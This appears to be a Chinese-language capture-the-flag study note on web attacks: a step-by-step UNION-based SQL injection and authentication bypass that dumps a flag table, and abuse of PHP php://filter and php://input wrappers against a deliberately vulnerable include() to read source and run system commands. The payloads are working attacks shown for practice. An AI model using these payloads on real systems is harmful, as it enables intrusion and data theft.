1. SQL 注入

步骤：

  1. 登录框：弱口令 or 万能密码
  2. 用常见字典爆一下（题目大概不会考字典容量）
  3. 测试万能密码：admin' or 1=1#，直接就进去了
  4. 找到注入点，走流程：
admin' or '1'='1' order by 1#
admin' or '1'='1' order by 2#
admin' or '1'='1' order by 3#   -- 三个字段
admin' or '1'='1' union select 1,2,3#
admin' or '1'='1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database();#
-- 得到表名: flag, user
admin' or '1'='1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='flag'#
-- 得到列名: flag
admin' or '1'='1' union select 1,group_concat(flag),3 from flag#
-- get!

2. PHP 伪协议

<?php include($_GET['url']);?>

在网址后面加 ?url=xxx，xxx 会被传递给 include()。

php://input

读取 HTTP 请求的原始 body（请求体），当作文件内容返回。如果 body 里有 PHP 代码，就会直接执行。

需要 POST 方式发请求，请求体写上代码。

php://filter

对文件内容做"过滤"（例如 base64 编码），用来读取任意文件源码。不需要 POST，直接 GET 就行。

?url=php://filter/read=convert.base64-encode/resource=flag.php

会把 flag.php 的内容转成 base64 输出，解码就看到源码了。

完整攻击示例

一个完整的 HTTP POST 请求由三部分组成：

  1. 请求行：POST /?url=php://input HTTP/1.1
  2. 请求头部：Host、Content-Type、Content-Length 等，一个空行分隔
  3. 请求体：我们写的 PHP 代码

第一次发送 — 侦查：

<?php system('ls -la');?>

第二次发送 — 读取：

<?php system('cat "ctf_go_go_go index.php"');?>

或者用通配符：<?php system('cat ctf*');?>
